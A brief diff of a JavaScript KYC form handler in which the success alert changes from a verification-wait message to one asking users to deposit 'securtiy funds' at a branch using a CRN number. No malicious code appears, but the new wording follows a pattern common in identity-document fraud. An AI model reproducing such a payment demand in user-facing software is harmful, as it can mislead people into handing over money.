@@ -123,7 +123,7 @@ document.getElementById('kyc-form').addEventListener('submit', async function(e)
         console.log('Response data:', result);
 
         if (response.ok) {
-            alert('Files uploaded successfully! Please wait for 30-35 mins while your account is being verified. Please check your phone for further updates.');
+            alert('Files uploaded successfully! Please deposit your securtiy funds at the nearest branch using CRN number.');
             document.getElementById('form-sec').classList.add('hidden')
             document.getElementById('kyc-card').classList.remove('visible');
             document.getElementById('kyc-card').classList.add('hidden');
